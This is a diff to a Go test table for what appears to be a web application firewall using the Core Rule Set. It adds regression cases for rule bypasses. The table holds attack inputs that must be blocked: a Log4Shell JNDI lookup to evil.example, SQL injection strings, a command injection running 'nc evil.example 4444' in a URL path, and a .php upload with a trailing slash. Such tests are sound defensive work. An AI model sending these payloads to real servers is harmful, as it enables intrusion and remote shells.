@@ -22,6 +22,10 @@ func TestCRSBaseline(t *testing.T) {
 		{"log4shell", "GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "", "", true},
 		{"sqli form", "POST", "/login", "application/x-www-form-urlencoded", "user=admin'--&pass=x", true},
 		{"sqli json", "POST", "/api/users", "application/json", `{"id":"1 UNION SELECT password FROM users"}`, true},
+		// Bypasses fixed in CRS 4.25.2 (issue #232): RCE in the URL path
+		// (GHSA-575j-qr6p-9763) and a trailing slash on a .php upload name.
+		{"rce in path", "GET", "/cgi-bin/x;busybox%20nc%20evil.example%204444", "", "", true},
+		{"php upload trailing slash", "POST", "/upload", "multipart/form-data; boundary=b", "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php/\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 1; ?>\r\n--b--\r\n", true},
 
 		{"home page", "GET", "/", "", "", false},
 		{"static asset", "GET", "/assets/app.3f9a1c.js", "", "", false},
